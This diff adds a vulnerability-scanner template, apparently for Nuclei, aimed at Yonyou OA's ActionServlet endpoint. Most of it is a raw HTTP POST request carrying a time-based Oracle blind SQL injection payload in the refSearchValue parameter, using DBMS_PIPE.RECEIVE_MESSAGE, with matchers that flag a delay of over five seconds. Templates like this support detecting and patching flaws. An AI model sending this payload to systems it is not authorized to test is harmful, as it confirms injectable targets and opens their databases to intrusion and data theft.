@@ -1,0 +1,35 @@
+id: yongyou-ActionServlet-refSearchValue-sqli
+
+info:
+  name: 用友OA接口com.ufida.web.action.ActionServlet参数refSearchValue存在SQL注入漏洞
+  author: g3m
+  severity: high
+
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      POST /service/~iufo/com.ufida.web.action.ActionServlet?RefTargetId=m_strUnitCode&onlyTwo=false&param_orgpk=level_code&retType=unit_code&Operation=Search&action=nc.ui.iufo.web.reference.base.UnitTableRefAction&method=execute HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 306
+      Connection: close
+      Cookie: JSESSIONID=CD33317BFA00683F8037482C4663FE25
+      Upgrade-Insecure-Requests: 1
+      Priority: u=0, i
+
+      TreeSelectedID=&TableSelectedID=&refSearchProp=unit_code&refSearchPropLbl=%E5%8D%95%E4%BD%8D%E7%BC%96%E7%A0%81&refSearchOper=%3D&refSearchOperLbl=%E7%AD%89%E4%BA%8E&refSearchValue=%27+or+1%3D1++AND+5662%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%28121%29%7C%7CCHR%2890%29%7C%7CCHR%2868%29%2C5%29--
+
+    matchers-condition: and
+    matchers:
+    - type: dsl
+      dsl:
+        - ' duration > 5 '
+    - type: status
+      status:
+        - 200
